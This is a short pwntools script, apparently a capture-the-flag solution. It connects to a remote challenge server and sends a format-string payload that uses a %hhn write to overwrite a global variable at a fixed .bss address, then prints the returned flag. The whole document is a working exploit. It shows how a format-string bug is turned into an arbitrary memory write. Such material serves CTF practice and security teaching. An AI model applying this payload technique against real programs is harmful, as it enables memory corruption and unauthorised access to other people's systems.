from pwn import *

r = remote('challenges.ctfd.io', 30266)

payload =  b'%32x%33xQ'   # padding to reach 0x42 bytes
payload += b'%8$hhn|'     # writing to the 8th element on the stack (which is "num"'s address, below)
payload += p64(0x404080)  # .bss <num>

r.sendlineafter('text', payload)
r.recvuntil('flag')
print(r.recv().decode('utf-8'))